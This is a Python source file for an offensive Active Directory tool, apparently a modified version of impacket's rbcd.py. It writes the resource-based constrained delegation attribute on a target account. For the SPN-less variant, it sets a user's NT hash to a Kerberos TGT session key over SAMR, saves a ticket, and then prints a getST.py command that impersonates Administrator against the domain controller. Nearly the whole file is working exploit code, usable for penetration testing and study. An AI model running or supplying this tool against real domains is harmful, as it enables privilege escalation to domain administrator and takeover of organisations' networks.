#!/usr/local/bin/python3
#
# Description: this script is a slightly modified version of RBCD.py script from the
#              impacket collection, providing additional support for exploiting rbcd
#              (msDS-AllowedToActOnBehalfOfOtherIdentity property exploitation) as 
#              a normal user without a SPN, which was demonstrated in 2022 by Jame Forshaw.
#              This script heavily relies in rbcd.py and features some code from snovvcrash's 
#              smbpasswd.py.
#
#              Example:
#                  python3 spnlessrbcd.py -action write -delegate-to "DC$" -delegate-from "j.doe" -dc-ip 10.10.13.37 -hashes :126502da14a98b58f2c319b81b3a49cb -spnless contoso.local/j.doe -debug
#
# Author:
#    @makider (https://makider.me/)
#
# References:
#    https://github.com/fortra/impacket/blob/master/examples/rbcd.py
#    https://github.com/snovvcrash/impacket/blob/master/examples/smbpasswd.py
#    https://twitter.com/tiraniddo 


from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.examples.utils import parse_target, init_ldap_session, parse_identity
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from impacket.dcerpc.v5 import transport, samr
from impacket.ntlm import compute_nthash
from binascii import hexlify
from rbcd import RBCD
import argparse
import sys
from impacket.examples import logger
from impacket import version
import binascii, hashlib
import logging
import traceback

def saveTicket(username, ticket, sessionKey):
        logging.info('Saving ticket in %s' % (username + '.ccache'))
        from impacket.krb5.ccache import CCache
        ccache = CCache()

        ccache.fromTGT(ticket, sessionKey, sessionKey)
        ccache.saveFile(username + '.ccache')

class SpnLessRBCD(RBCD):
    def __init__(self, ldap_server, ldap_session, delegate_to):
        super().__init__(ldap_server, ldap_session, delegate_to)
        logging.debug('SPNLESSRBCD initialized')

    def hSamrChangePasswordUser(self, username, domain, address, newPwdHashNT, oldNThash):
            logging.info(f"changing user password for {username} to {newPwdHashNT}")
            rpctransport = transport.SMBTransport(address, filename=r'\samr')
            rpctransport.set_credentials(username=username, password='', domain=domain, lmhash='', nthash=oldNThash, aesKey='')
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)
            logging.debug("Bound to SAMR interface")
            try:
                serverHandle = samr.hSamrConnect(dce, address + '\x00')['ServerHandle']
                domainSID = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain)['DomainId']
                domainHandle = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainSID)['DomainHandle']
                userRID = samr.hSamrLookupNamesInDomain(dce, domainHandle, (username,))['RelativeIds']['Element'][0]
                userHandle = samr.hSamrOpenUser(dce, domainHandle, userId=userRID)['UserHandle']
            except Exception as e:
                logging.error(f"Failed SAMR steps: {e}")
                return

            try:
                logging.debug("Attempting to change password...")
                resp = samr.hSamrChangePasswordUser(
                    dce,
                    userHandle,
                    '',
                    newPassword='',
                    oldPwdHashNT=oldNThash,
                    newPwdHashLM='',
                    newPwdHashNT=newPwdHashNT
                )
                logging.debug("success!")
            except Exception as e:
                logging.debug(e)
                return
            finally:
            	logging.debug("disconnecting from SAMR interface")
            	dce.disconnect()

    def execute_spnless(self, domain, username, password=None, nthash=None, lmhash=None, aesKey=None, kdchost=None, serverName=None):
        if aesKey != None:
            print(aesKey)
            raise NotImplementedError("cannot use aes key with -spnless option!")
        if password != "":
            logging.debug("password is not none")
            nthash = compute_nthash(password).hex()
            password = None

        principal = Principal(username, type=1)

        logging.info(f"getting TGT for {principal}")

        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
            clientName=principal,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash,
            aesKey=aesKey,
            kdcHost=kdchost,
            serverName=serverName
        )

        saveTicket(username, tgt, oldSessionKey)

        gotsessionkey = hexlify(sessionKey.contents).decode('utf-8')
        logging.debug(f"Got session key for {username}: {gotsessionkey}")

        self.hSamrChangePasswordUser(username, domain, kdchost, gotsessionkey, nthash)


def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Python (re)setter for property msDS-AllowedToActOnBehalfOfOtherIdentity for Kerberos RBCD attacks.')
    parser.add_argument('identity', action='store', help='domain.local/username[:password]')
    parser.add_argument("-delegate-to", type=str, required=True,
                        help="Target account the DACL is to be read/edited/etc.")
    parser.add_argument("-delegate-from", type=str, required=False,
                        help="Attacker controlled account to write on the rbcd property of -delegate-to (only when using `-action write`)")
    parser.add_argument('-action', choices=['read', 'write', 'remove', 'flush'], nargs='?', default='read',
                        help='Action to operate on msDS-AllowedToActOnBehalfOfOtherIdentity')

    parser.add_argument('-spnless', action='store_true', help='trick DC to execute RBCD as a normal user without SPN (!WARNING! renders the user unusable for normal users!) ')

    parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')

    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If '
                            'omitted it will use the domain part (FQDN) specified in '
                            'the identity parameter')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted, -dc-ip will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def main():
    print(version.BANNER)
    args = parse_args()
    logger.init(args.ts, args.debug)

    if args.action == 'write' and args.delegate_from is None:
        logging.critical('`-delegate-from` should be specified when using `-action write` !')
        sys.exit(1)

    domain, username, password, lmhash, nthash, args.k = parse_identity(args.identity, args.hashes, args.no_pass, args.aesKey, args.k)

    try:
        ldap_server, ldap_session = init_ldap_session(domain, username, password, lmhash, nthash, args.k, args.dc_ip, args.dc_host, args.aesKey, args.use_ldaps)
        rbcd = SpnLessRBCD(ldap_server, ldap_session, args.delegate_to)
        if args.spnless:
            check = input("warning! this action will render the user unusable without the tgt! are you sure you want to continue? [Y/N]")
            if check == "Y" or check == "y":
                rbcd.execute_spnless(domain, username, password, nthash, lmhash, args.aesKey, args.dc_ip, args.dc_host)
            else:
                logging.info("exiting!")
                exit(0)
        if args.action == 'read':
            rbcd.read()
        elif args.action == 'write':
            rbcd.write(args.delegate_from)
        elif args.action == 'remove':
            rbcd.remove(args.delegate_from)
        elif args.action == 'flush':
            rbcd.flush()
        if args.spnless:
        	logging.info("the password of the user has been changed to the session key of the TGT! to exploit SPN-less RBCD use getST.py")
        	logging.info(f"KRB5CCNAME={username}.ccache python3 getST.py -u2u -impersonate Administrator -spn 'cifs/YOUR_DC_COMPUTER_NAME.{domain}' -k -no-pass {domain}/{username}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))


if __name__ == '__main__':
    main()